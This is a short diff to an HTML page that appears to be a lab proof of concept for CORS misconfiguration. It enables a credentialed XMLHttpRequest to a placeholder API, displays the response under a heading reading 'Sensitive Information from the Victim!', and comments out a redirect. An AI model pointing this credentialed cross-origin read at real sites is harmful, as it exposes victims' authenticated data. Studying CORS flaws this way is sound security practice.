@@ -6,10 +6,11 @@
     <title>Document</title>
 </head>
 <body>
+    <h1>Sensitive Information from the Victim!</h1>
     <p id="responseText"></p> <!-- Add a paragraph tag with an id -->
     <script>
         var req = new XMLHttpRequest();
-        // req.onload = reqListener;
+        req.onload = reqListener;
         req.open('get','https://jsonplaceholder.typicode.com/posts/1',true);
         req.withCredentials = true;
         req.send();
@@ -17,7 +18,8 @@
         function reqListener() {
             var responseText = this.responseText; // Store the response text in a variable
             document.getElementById('responseText').textContent = responseText; // Set the text content of the paragraph tag
-            location='/sample/satzcors.html'; // Navigate to the specified page
+            // Remove the line below to stop the continuous reloading
+            // location='/satz.html'; // Navigate to the specified page
         };
     </script>
 </body>
